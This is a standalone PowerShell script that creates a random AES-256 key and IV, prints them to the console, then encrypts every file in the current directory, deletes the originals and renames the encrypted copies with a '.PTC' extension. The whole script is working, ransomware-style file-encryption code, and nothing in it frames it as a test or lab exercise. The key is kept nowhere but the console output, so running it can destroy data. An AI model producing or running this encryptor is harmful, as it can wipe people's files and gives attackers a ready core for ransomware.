# Function to generate a random key and IV for AES encryption
function Generate-AesKeyAndIv {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256  # Choose 128, 192, or 256 for AES key size

    $aes.GenerateKey()
    $aes.GenerateIV()

    # Output the raw byte arrays (correct sizes for AES)
    [PSCustomObject]@{
        Key = $aes.Key
        IV = $aes.IV
    }
}

# Function to encrypt a file using AES
function Encrypt-File {
    param (
        [byte[]]$key,
        [byte[]]$iv,
        [string]$filePath
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key  # Use the generated key
    $aes.IV = $iv    # Use the generated IV

    $encryptor = $aes.CreateEncryptor()

    $tempFilePath = "$filePath.temp"

    try {
        $inputStream = [System.IO.File]::OpenRead($filePath)
        $outputStream = [System.IO.File]::OpenWrite($tempFilePath)

        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outputStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

        $buffer = New-Object byte[] 4096
        $bytesRead = 0
        while (($bytesRead = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $cryptoStream.Write($buffer, 0, $bytesRead)
        }

        $cryptoStream.FlushFinalBlock()
    }
    finally {
        $inputStream.Close()
        $cryptoStream.Close()
        $outputStream.Close()
    }

    # Remove the original file and rename the encrypted file
    Remove-Item -Path $filePath
    Rename-Item -Path $tempFilePath -NewName ($filePath + ".PTC")
}

# Generate AES key and IV
$keyAndIv = Generate-AesKeyAndIv
$key = $keyAndIv.Key
$iv = $keyAndIv.IV

# Output the generated key and IV (for reference)
Write-Output "Generated AES Key: $([BitConverter]::ToString($key) -replace '-','')"
Write-Output "Generated AES IV: $([BitConverter]::ToString($iv) -replace '-','')"

# Get all files in the current directory
$files = Get-ChildItem -Path . -File

foreach ($file in $files) {
    $filePath = $file.FullName
    
    Encrypt-File -key $key -iv $iv -filePath $filePath
}

Write-Output "Encryption complete."
